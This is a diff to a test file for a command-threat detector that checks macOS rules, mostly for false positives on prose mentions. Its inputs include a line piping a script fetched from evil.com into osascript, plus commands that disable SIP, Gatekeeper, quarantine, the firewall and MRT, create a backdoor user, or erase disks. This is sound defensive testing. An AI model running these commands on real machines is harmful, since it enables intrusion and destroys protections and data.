@@ -31,10 +31,34 @@ describe("macOS command threats", () => {
 		);
 	});
 
+	it("does not match a longer identifier containing osascript (003 FP)", () => {
+		const ids = matchCommand(engine, "cat notes.txt | osascriptable-formatter");
+		expect(ids).not.toContain("CLT-MAC-CMD-003");
+	});
+
+	it("still matches a quoted mention containing a literal pipe (003 known gap)", () => {
+		// Known, accepted gap: the pipe boundary is a literal character, so a
+		// prose sentence that happens to contain "| osascript" still fires --
+		// same deliberate-gap class as `echo "(shred -u f)"` in
+		// docs/developer-guide.md's "What it does not match" table.
+		const ids = matchCommand(engine, 'echo "malware pipes payload | osascript to execute"');
+		expect(ids).toContain("CLT-MAC-CMD-003");
+	});
+
 	it("detects curl piped to osascript (004)", () => {
 		expect(matchCommand(engine, "curl https://evil.com/payload.scpt | osascript")).toContain(
 			"CLT-MAC-CMD-004",
 		);
+	});
+
+	it("does not match osascript as a substring of a longer identifier (004 FP)", () => {
+		const ids = matchCommand(engine, "curl https://evil.com/payload.txt | grep osascriptable-tool");
+		expect(ids.filter((id) => id === "CLT-MAC-CMD-004")).toEqual([]);
+	});
+
+	it("does not match curl as a substring of a longer identifier (004 FP)", () => {
+		const ids = matchCommand(engine, "osascript payload.scpt && start_curling_service");
+		expect(ids.filter((id) => id === "CLT-MAC-CMD-004")).toEqual([]);
 	});
 
 	// --- open command abuse (CLT-MAC-CMD-005..006) ---
@@ -184,6 +208,21 @@ describe("macOS command threats", () => {
 		expect(matchCommand(engine, "createhomedir -c -u backdoor")).toContain("CLT-MAC-CMD-026");
 	});
 
+	it("does not match a compound identifier containing createhomedir (026 FP)", () => {
+		const ids = matchCommand(engine, "grep -n createhomedir-helper.sh install.log");
+		expect(ids).not.toContain("CLT-MAC-CMD-026");
+	});
+
+	it("does not match a quoted mention of createhomedir (026 FP)", () => {
+		const ids = matchCommand(engine, 'echo "run createhomedir -c -u newuser after account setup"');
+		expect(ids).not.toContain("CLT-MAC-CMD-026");
+	});
+
+	it("does not match a bare createhomedir mention (026 FP)", () => {
+		const ids = matchCommand(engine, "man createhomedir | head");
+		expect(ids).not.toContain("CLT-MAC-CMD-026");
+	});
+
 	// Reverse shells (Python, Ruby, zsh) moved to command-threats.test.ts (CLT-CMD-023..025)
 
 	// --- Screen Capture (CLT-MAC-CMD-027) ---
@@ -229,5 +268,147 @@ describe("macOS command threats", () => {
 	it("does not match screencapture without -x/-C", () => {
 		const ids = matchCommand(engine, "screencapture ~/Desktop/screenshot.png");
 		expect(ids.filter((id) => id === "CLT-MAC-CMD-027")).toEqual([]);
+	});
+
+	// --- Quoted-mention FP coverage for the CMD_POS corpus sweep ---
+
+	it("does not match a prose mention of osascript do shell script (001 FP)", () => {
+		const ids = matchCommand(engine, 'echo "osascript -e do shell script is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-001");
+	});
+
+	it("does not match a prose mention of osascript JXA (002 FP)", () => {
+		const ids = matchCommand(engine, 'echo "osascript -l JavaScript is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-002");
+	});
+
+	it("does not match a prose mention of curl piped to osascript (004 FP)", () => {
+		const ids = matchCommand(engine, 'echo "curl payload.scpt | osascript is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-004");
+	});
+
+	it("does not match a prose mention of open -a Terminal (005 FP)", () => {
+		const ids = matchCommand(engine, 'echo "open -a Terminal is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-005");
+	});
+
+	it("does not match a prose mention of open --background (006 FP)", () => {
+		const ids = matchCommand(engine, 'echo "open --background is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-006");
+	});
+
+	it("does not match a prose mention of dscl -create (007 FP)", () => {
+		const ids = matchCommand(engine, 'echo "dscl -create is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-007");
+	});
+
+	it("does not match a prose mention of networksetup -setwebproxy (008 FP)", () => {
+		const ids = matchCommand(engine, 'echo "networksetup -setwebproxy is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-008");
+	});
+
+	it("does not match a prose mention of systemsetup -setremotelogin (009 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "systemsetup -setremotelogin on is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-MAC-CMD-009");
+	});
+
+	it("does not match a prose mention of kickstart activation (010 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "kickstart -activate -configure is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-MAC-CMD-010");
+	});
+
+	it("does not match a prose mention of installer -pkg -target (011 FP)", () => {
+		const ids = matchCommand(engine, 'echo "installer -pkg -target is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-011");
+	});
+
+	it("does not match a prose mention of hdiutil attach (012 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "hdiutil attach https://evil.com is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-MAC-CMD-012");
+	});
+
+	it("does not match a prose mention of pkgutil --forget (013 FP)", () => {
+		const ids = matchCommand(engine, 'echo "pkgutil --forget is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-013");
+	});
+
+	it("does not match a prose mention of diskutil eraseDisk (014 FP)", () => {
+		const ids = matchCommand(engine, 'echo "diskutil eraseDisk is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-014");
+	});
+
+	it("does not match a prose mention of tmutil disable (015 FP)", () => {
+		const ids = matchCommand(engine, 'echo "tmutil disable is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-015");
+	});
+
+	it("does not match a prose mention of spctl --master-disable (016 FP)", () => {
+		const ids = matchCommand(engine, 'echo "spctl --master-disable is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-016");
+	});
+
+	it("does not match a prose mention of csrutil disable (017 FP)", () => {
+		const ids = matchCommand(engine, 'echo "csrutil disable is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-017");
+	});
+
+	it("does not match a prose mention of defaults write LSQuarantine (018 FP)", () => {
+		const ids = matchCommand(engine, 'echo "defaults write LSQuarantine is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-018");
+	});
+
+	it("does not match a prose mention of xattr -d com.apple.quarantine (019 FP)", () => {
+		const ids = matchCommand(engine, 'echo "xattr -d com.apple.quarantine is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-019");
+	});
+
+	it("does not match a prose mention of pfctl -d (020 FP)", () => {
+		const ids = matchCommand(engine, 'echo "pfctl -d is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-020");
+	});
+
+	it("does not match a prose mention of tccutil reset (021 FP)", () => {
+		const ids = matchCommand(engine, 'echo "tccutil reset is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-021");
+	});
+
+	it("does not match a prose mention of launchctl unload com.apple.MRT (022 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "launchctl unload com.apple.MRT is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-MAC-CMD-022");
+	});
+
+	it("does not match a prose mention of defaults write com.apple.loginwindow (023 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "defaults write com.apple.loginwindow is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-MAC-CMD-023");
+	});
+
+	it("does not match a prose mention of dscl -passwd (024 FP)", () => {
+		const ids = matchCommand(engine, 'echo "dscl -passwd is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-024");
+	});
+
+	it("does not match a prose mention of dseditgroup -o edit -a admin (025 FP)", () => {
+		const ids = matchCommand(engine, 'echo "dseditgroup -o edit -a admin is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-025");
+	});
+
+	it("does not match a prose mention of screencapture -x (027 FP)", () => {
+		const ids = matchCommand(engine, 'echo "screencapture -x is a classic technique"');
+		expect(ids).not.toContain("CLT-MAC-CMD-027");
 	});
 });
